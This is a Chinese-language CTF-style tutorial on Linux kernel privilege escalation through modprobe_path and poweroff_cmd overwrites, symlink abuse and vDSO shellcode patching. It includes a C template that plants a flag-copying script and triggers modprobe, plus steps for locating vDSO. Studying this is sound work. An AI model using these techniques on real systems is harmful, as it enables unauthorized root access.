# Change Others

如果我们可以改变特权进程的执行轨迹，也可以实现提权。这里我们从以下角度来考虑如何改变特权进程的执行轨迹。

- 改数据
- 改代码

## 改数据

这里给出几种通过改变特权进程使用的数据来进行提权的方法。

### 符号链接

如果一个 root 权限的进程会执行一个符号链接的程序，并且该符号链接或者符号链接指向的程序可以由攻击者控制，攻击者就可以实现提权。 

### call_usermodehelper

`call_usermodehelper` 是一种内核线程执行用户态应用的方式，并且启动的进程具有 root 权限。因此，如果我们能够控制具体要执行的应用，那就可以实现提权。在内核中，`call_usermodehelper` 具体要执行的应用往往是由某个变量指定的，因此我们只需要想办法修改掉这个变量即可。不难看出，这是一种典型的数据流攻击方法。一般常用的主要有以下几种方式。

#### 修改 modprobe_path

修改 modprobe_path 实现提权的基本流程如下

1. 获取 modprobe_path 的地址。
2. 修改 modprobe_path 为指定的程序。
3. 触发执行 `call_modprobe `，从而实现提权 。这里我们可以利用以下几种方式来触发
    1. 执行一个非法的可执行文件。非法的可执行文件需要满足相应的要求（参考 call_usermodehelper 部分的介绍）。
    2. 使用未知协议来触发。

这里我们也给出使用 modprobe_path 的模板。

```c
// step 1. modify modprobe_path to the target value

// step 2. create related file
system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag' > /home/pwn/catflag.sh");
system("chmod +x /home/pwn/catflag.sh");

// step 3. trigger it using unknown executable
system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
system("chmod +x /home/pwn/dummy");
system("/home/pwn/dummy");

// step 3. trigger it using unknown protocol
socket(AF_INET,SOCK_STREAM,132);
```

在这个过程中，我们着重关注下如何定位 modprobe_path。

##### 直接定位

由于 modprobe_path 的取值是确定的，所以我们可以直接扫描内存，寻找对应的字符串。这需要我们具有扫描内存的能力。

##### 间接定位

考虑到 modprobe_path 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 modprobe_path 的地址。

#### 修改 poweroff_cmd

1. 修改 poweroff_cmd 为指定的程序。
2. 劫持控制流执行 `__orderly_poweroff`。

关于如何定位 poweroff_cmd，我们可以采用类似于定位 `modprobe_path` 的方法。

## 改代码

在程序运行时，如果我们可以修改 root 权限进程执行的代码，那其实我们也可以实现提权。

### 修改 vDSO 代码

内核中 vDSO 的代码会被映射到所有的用户态进程中。如果有一个高特权的进程会周期性地调用 vDSO 中的函数，那我们可以考虑把 vDSO 中相应的函数修改为特定的 shellcode。当高权限的进程执行相应的代码时，我们就可以进行提权。

在早期的时候，Linux 中的 vDSO 是可写的，考虑到这样的风险，Kees Cook 提出引入 `post-init read-only` 的数据，即将那些初始化后不再被写的数据标记为只读，来防御这样的利用。

在引入之前，vDSO 对应的 raw_data 只是标记了对齐属性。

```c
	fprintf(outfile, "/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n");
	fprintf(outfile, "#include <linux/linkage.h>\n");
	fprintf(outfile, "#include <asm/page_types.h>\n");
	fprintf(outfile, "#include <asm/vdso.h>\n");
	fprintf(outfile, "\n");
	fprintf(outfile,
		"static unsigned char raw_data[%lu] __page_aligned_data = {",
		mapping_size);
```

引入之后，vDSO 对应的 raw_data 则被标记为了初始化后只读。

```c
	fprintf(outfile, "/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n");
	fprintf(outfile, "#include <linux/linkage.h>\n");
	fprintf(outfile, "#include <asm/page_types.h>\n");
	fprintf(outfile, "#include <asm/vdso.h>\n");
	fprintf(outfile, "\n");
	fprintf(outfile,
		"static unsigned char raw_data[%lu] __ro_after_init __aligned(PAGE_SIZE) = {",
		mapping_size);
```

通过修改 vDSO 进行提权的基本方式如下

- 定位 vDSO
- 修改 vDSO 的特定函数为指定的 shellcode
- 等待触发执行 shellcode

这里我们着重关注下如何定位 vDSO。

#### ida 里定位

这里我们介绍一下如何在 vmlinux 中找到 vDSO 的位置。

1. 在 ida 里定位 init_vdso 函数的地址

```c
__int64 init_vdso()
{
  init_vdso_image(&vdso_image_64 + 0x20000000);
  init_vdso_image(&vdso_image_x32 + 0x20000000);
  cpu_maps_update_begin();
  on_each_cpu((char *)startup_64 + 0x100003EA0LL, 0LL, 1LL);
  _register_cpu_notifier(&sdata + 536882764);
  cpu_maps_update_done();
  return 0LL;
}
```

2. 可以看到 `vdso_image_64` 和 `vdso_image_x32`。以`vdso_image_64` 为例，点到该变量的地址

```
.rodata:FFFFFFFF81A01300                 public vdso_image_64
.rodata:FFFFFFFF81A01300 vdso_image_64   dq offset raw_data      ; DATA XREF: arch_setup_additional_pages+18↑o
.rodata:FFFFFFFF81A01300                                         ; init_vdso+1↓o
```

3. 点击 `raw_data` 即可知道 64 位 vDSO 在内核镜像中的地址，可以看到，vDSO 确实是以页对齐的。

```
.data:FFFFFFFF81E04000 raw_data        db  7Fh ;              ; DATA XREF: .rodata:vdso_image_64↑o
.data:FFFFFFFF81E04001                 db  45h ; E
.data:FFFFFFFF81E04002                 db  4Ch ; L
.data:FFFFFFFF81E04003                 db  46h ; F
```

从最后的符号来看，我们也可以直接使用 `raw_data` 来寻找 vDSO。

#### 内存中定位

##### 直接定位

vDSO 其实是一个 ELF 文件，具有 ELF 文件头。同时，vDSO 中特定位置存储着导出函数的字符串。因此我们可以根据这两个特征来扫描内存，定位 vDSO 的位置。

##### 间接定位

考虑到 vDSO 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 vDSO 的地址。

#### 参考

- https://lwn.net/Articles/676145/
- https://lwn.net/Articles/666550/





